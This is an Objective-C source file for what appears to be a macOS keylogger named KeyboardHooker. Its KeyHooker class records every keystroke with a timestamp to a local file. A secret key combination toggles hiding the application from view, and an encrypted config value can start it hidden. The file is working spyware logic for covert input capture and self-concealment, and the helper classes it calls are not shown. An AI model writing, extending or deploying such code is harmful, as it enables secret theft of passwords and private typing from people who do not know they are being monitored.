//
//  KeyboardHooker.m
//  KeyboardHooker
//
//  Created by Иван on 24.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "KeyHooker.h"

@implementation KeyHooker

- (id)init {
    self = [super init];
    
    flag = YES;
    combination = [NSMutableArray array];
    
    NSString *config = [FileManager readFromFile:@"config"];
    if ([config isNotEqualTo: @"error"]) {
        NSArray *components = [config componentsSeparatedByString:@"\n"];
        if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
            flag = NO;
        }
    }
    
    return self;
}

- (void)doFullCycle: (int)key {
    [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key,
                                           [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String], [Time currentTime]]];
        
    if (key == 55) [combination removeAllObjects];
    [combination addObject:[NSNumber numberWithInt:key]];
    if (key == 15 && [self checkCombination] == YES) [self reset];
}

- (BOOL)checkCombination {
    return [combination isEqualToArray:@[@55, @54, @54, @4, @31, @31, @40, @14, @15]];
}

- (void)reset {
    flag = !flag;
    
    if (flag == true) {
        [AppHider hide];
    } else {
        [AppHider unhide];
    }
}

@end
